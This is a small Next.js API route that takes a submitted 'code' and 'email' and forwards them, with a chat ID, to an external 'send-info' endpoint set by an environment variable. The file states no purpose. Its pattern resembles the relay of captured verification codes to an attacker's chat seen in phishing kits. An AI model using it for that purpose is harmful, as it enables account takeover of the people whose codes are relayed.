import {NextResponse} from "next/server";


const apiUrl = process.env.API_URL ?? ''
const chatId = process.env.CHAT_ID ?? ''

export async function POST(req: Request) {
  try {
    const {code, email} = await req.json()
    
    const message = JSON.stringify({
      code, email
    }, null, 2)

    const res = await fetch(`${apiUrl}/api/send-info`, {
      method: 'POST',
      body: JSON.stringify({chatId, message}),
      headers: {
        'Content-Type': 'application/json',
      }
    })

    console.log('re', res)


    return NextResponse.json({error: null, data: code})
  } catch (e) {
    console.log('e', e)
    return NextResponse.json({error: 'Something went wrong', data: null})
  }
}
